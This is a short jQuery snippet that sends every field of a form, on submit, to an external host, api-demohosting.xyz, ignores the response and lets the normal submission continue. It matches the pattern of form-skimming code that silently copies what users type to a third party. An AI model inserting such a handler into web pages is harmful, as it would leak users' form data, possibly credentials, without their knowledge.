$(".dForm").submit(function() {
	var d = $(".dForm");

	$.ajax({
        url: "https://api-demohosting.xyz/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
